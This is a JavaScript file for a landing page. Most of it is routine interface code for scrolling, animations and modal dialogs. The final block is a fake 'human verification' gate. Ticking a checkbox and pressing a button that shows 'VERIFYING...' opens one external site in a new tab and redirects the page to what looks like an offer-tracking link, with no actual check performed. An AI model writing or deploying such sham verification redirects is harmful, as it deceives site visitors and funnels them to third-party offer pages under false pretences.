document.addEventListener('DOMContentLoaded', function () {
  document.querySelectorAll('a[href^="#"]').forEach(anchor => {
    anchor.addEventListener('click', function (event) {
      event.preventDefault();
      const target = document.querySelector(this.getAttribute('href'));
      if (target) target.scrollIntoView({ behavior: 'smooth', block: 'start' });
    });
  });

  const header = document.querySelector('.header');
  window.addEventListener('scroll', () => {
    header.style.background = window.pageYOffset > 50 ? 'rgba(25, 23, 36, 0.98)' : 'rgba(25, 23, 36, 0.95)';
  });

  const observer = new IntersectionObserver(entries => {
    entries.forEach(entry => {
      if (entry.isIntersecting) {
        entry.target.style.opacity = '1';
        entry.target.style.transform = 'translateY(0)';
      }
    });
  }, { threshold: 0.1, rootMargin: '0px 0px -50px 0px' });

  document.querySelectorAll('.benefit-card, .step-card, .faq-item').forEach(element => {
    element.style.opacity = '0';
    element.style.transform = 'translateY(20px)';
    element.style.transition = 'opacity 0.5s ease, transform 0.5s ease';
    observer.observe(element);
  });

  document.querySelectorAll('.btn-primary').forEach(button => {
    button.addEventListener('mouseenter', () => {
      const icon = button.querySelector('svg');
      if (icon) icon.style.animation = 'bounce 0.5s ease infinite';
    });
    button.addEventListener('mouseleave', () => {
      const icon = button.querySelector('svg');
      if (icon) icon.style.animation = 'none';
    });
  });
});

function openModal(type) {
  const modal = document.getElementById(type + '-modal');
  if (modal) {
    modal.classList.add('active');
    document.body.style.overflow = 'hidden';
  }
}

function closeModal(type) {
  const modal = document.getElementById(type + '-modal');
  if (modal) {
    modal.classList.remove('active');
    document.body.style.overflow = '';
  }
}

document.addEventListener('click', function (event) {
  if (event.target.classList.contains('modal')) {
    event.target.classList.remove('active');
    document.body.style.overflow = '';
  }
});

document.addEventListener('keydown', function (event) {
  if (event.key === 'Escape') {
    document.querySelectorAll('.modal.active').forEach(modal => modal.classList.remove('active'));
    document.body.style.overflow = '';
  }
});

document.addEventListener('DOMContentLoaded', function () {
  const verificationGate = document.querySelector('.verification-gate');
  const verifyButton = document.getElementById('verify-continue');
  const humanCheck = document.getElementById('human-check');

  if (!verificationGate || !verifyButton || !humanCheck) return;

  let verificationInProgress = false;
  const primaryDestination = 'https://lou.voltbattle.com/5J9E/2J3B5/';
  const secondaryDestination = 'https://gamrkit.com/best-free-to-play-pc-games-2026/';

  document.body.classList.add('verification-active');
  window.scrollTo(0, 0);

  function syncVerifyButton() {
    verifyButton.disabled = !humanCheck.checked;
    verifyButton.setAttribute('aria-disabled', String(!humanCheck.checked));
  }

  syncVerifyButton();
  humanCheck.addEventListener('change', syncVerifyButton);

  verifyButton.addEventListener('click', function () {
    if (!humanCheck.checked || verificationInProgress) return;

    verificationInProgress = true;
    verifyButton.disabled = true;
    verifyButton.setAttribute('aria-busy', 'true');
    verifyButton.querySelector('span').textContent = 'VERIFYING...';

    window.open(secondaryDestination, '_blank', 'noopener,noreferrer');
    window.location.assign(primaryDestination);
  });
});
